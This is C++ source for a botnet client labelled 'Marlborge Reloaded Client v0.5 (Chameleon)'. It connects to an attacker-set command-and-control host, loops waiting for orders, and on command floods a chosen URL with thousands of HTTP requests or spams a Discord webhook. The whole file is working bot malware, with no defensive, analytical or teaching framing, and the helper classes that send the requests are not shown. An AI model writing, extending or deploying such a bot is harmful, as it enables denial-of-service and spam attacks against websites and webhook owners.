#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cpr/cpr.h>
#include <sstream>

#include "DiscordThings.h"
#include "HTTP.h"

using namespace std;

#pragma comment(lib, "Ws2_32.lib")

#define HOST "127.0.0.1" // Set your VPS IP Addres
#define PORT 3000 // Set the connection port
#define REQQUANTITY 3000

WSADATA wsaData;

SOCKET sock;
sockaddr_in saIn;
int iResult;

DiscordThings* dcThings;
HTTP* http;

char buffer[1024];

void ClearBuffer() {
	memset(buffer, 0, sizeof(buffer));
}

void CloseSocket() {
	closesocket(sock);
	sock = NULL;
	WSACleanup();
	iResult = NULL;
	return;
}

void DoS() {
	recv(sock, buffer, sizeof(buffer), 0);
	cout << "Sending requests to the specified URL" << endl;
	stringstream ss;
	ss << buffer; string url; ss >> url;
	http->DoS(url, REQQUANTITY);
}

void SpamDiscordWebhook() {
	stringstream ss;
	ClearBuffer();
	ss << buffer; string webhook; ss >> webhook;
	ClearBuffer();
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; string msg; ss >> msg;
	ClearBuffer();
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; int quantity; ss >> quantity;

	dcThings->SpamDiscordWebhook(webhook, msg, quantity);
}

void ConnectSocket() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (iResult != 0) {
		cout << "Failed at startup" << endl;
		exit(0);
	}

	if (iResult == INVALID_SOCKET) {
		cout << "Invalid socket" << endl;
		exit(0);
	}

	saIn.sin_family = AF_INET;
	inet_pton(AF_INET, HOST, &saIn.sin_addr.s_addr);
	saIn.sin_port = htons(PORT);
	iResult = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));

	if (iResult == SOCKET_ERROR) {
		cout << "Connection error" << endl;
		CloseSocket();
		ConnectSocket();
		return;
	}

	cout << "Connected" << endl;
}

void Listen() {
	cout << "Listening to the host" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	stringstream ss;
	ss << buffer; int opt; ss >> opt;
	ClearBuffer();

	switch (opt) {
	case 1:
		DoS();
		break;
	case 2:
		SpamDiscordWebhook();
		break;
	default:
		cout << "Invalid option sent from host" << endl;
		break;
	}

	Listen();
	return;
}

int main() {
	cout << "Marlborge Reloaded Client v0.5 (Chameleon)" << endl;
	ConnectSocket();
	Listen();
	main();

	return 0;
}